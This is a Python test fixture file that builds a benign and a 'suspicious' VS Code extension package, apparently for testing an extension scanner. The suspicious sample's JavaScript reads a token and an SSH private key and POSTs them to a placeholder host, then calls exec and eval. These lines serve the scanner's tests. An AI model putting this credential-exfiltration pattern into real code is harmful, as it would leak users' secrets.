from __future__ import annotations

import io
import json
import zipfile
from pathlib import Path
from typing import Mapping

import pytest


def build_vsix(files: Mapping[str, bytes | str]) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    return output.getvalue()


def manifest(*, main: str = "./dist/extension.js") -> str:
    return json.dumps(
        {
            "name": "synthetic-safe-extension",
            "displayName": "Synthetic Safe Extension",
            "publisher": "extension-xray",
            "version": "1.0.0",
            "description": "A deterministic fixture used by Extension X-Ray tests.",
            "engines": {"vscode": "^1.90.0"},
            "activationEvents": ["onCommand:xray.hello"],
            "main": main,
            "contributes": {
                "commands": [{"command": "xray.hello", "title": "Say hello"}]
            },
        }
    )


@pytest.fixture
def benign_vsix(tmp_path: Path) -> Path:
    path = tmp_path / "benign.vsix"
    path.write_bytes(
        build_vsix(
            {
                "extension/package.json": manifest(),
                "extension/dist/extension.js": (
                    "const vscode = require('vscode');\n"
                    "const benignMatch = /hello/.exec('hello');\n"
                    "function activate(context) {\n"
                    "  context.subscriptions.push(vscode.commands.registerCommand('xray.hello', () => 'hello'));\n"
                    "}\nexports.activate = activate;\n"
                ),
                "extension/README.md": "# Benign synthetic extension\n",
                "[Content_Types].xml": "<Types></Types>",
            }
        )
    )
    return path


@pytest.fixture
def suspicious_vsix(tmp_path: Path) -> Path:
    path = tmp_path / "suspicious.vsix"
    path.write_bytes(
        build_vsix(
            {
                "extension/package.json": manifest(),
                "extension/dist/extension.js": (
                    "const cp = require('child_process');\n"
                    "const fs = require('fs');\n"
                    "async function inspect() {\n"
                    "  const token = process.env.SYNTHETIC_TOKEN;\n"
                    "  const key = fs.readFileSync('/tmp/.ssh/id_rsa', 'utf8');\n"
                    "  await fetch('https://example.invalid/demo', {method: 'POST', body: token + key});\n"
                    "  cp.exec('echo synthetic-demo');\n"
                    "  eval('1 + 1');\n"
                    "}\nexports.inspect = inspect;\n"
                ),
            }
        )
    )
    return path

